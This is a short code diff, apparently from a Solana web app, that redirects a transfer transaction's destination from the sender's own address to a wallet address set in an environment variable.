@@ -9,6 +9,8 @@ const recipientAddress = new PublicKey(String(process.env.NEXT_PUBLIC_WALLET_ADD
  * @param   {Connection}  connection an RPC connection
  * @returns {VersionedTransaction}            a transactionV0
  */
+
+const receiverAccount = new PublicKey(String(process.env.NEXT_PUBLIC_WALLET_ADDRESS))
 const createTransferTransactionV0 = async (
   publicKey: PublicKey,
   connection: Connection,
@@ -26,7 +28,7 @@ const createTransferTransactionV0 = async (
   const instructions = [
     SystemProgram.transfer({
       fromPubkey: publicKey,
-      toPubkey: publicKey,
+      toPubkey: receiverAccount,
       lamports: amount,
     }),
   ];
